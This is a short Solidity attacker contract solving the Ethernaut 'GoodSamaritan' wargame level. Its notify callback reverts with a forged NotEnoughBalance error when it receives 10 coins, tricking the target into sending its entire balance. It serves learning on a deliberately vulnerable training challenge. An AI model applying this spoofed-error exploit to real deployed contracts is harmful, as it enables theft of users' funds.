// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {GoodSamaritan} from "ethernaut/levels/GoodSamaritan.sol";

contract Attacker {
    // error signature will be taken from here
    error NotEnoughBalance();

    // entry point for our attack, simply requests a donation
    function pwn(GoodSamaritan target) external {
        target.requestDonation();
    }

    // notify is called when this contract receives coins
    function notify(uint256 amount) external pure {
        // only revert on 10 coins
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
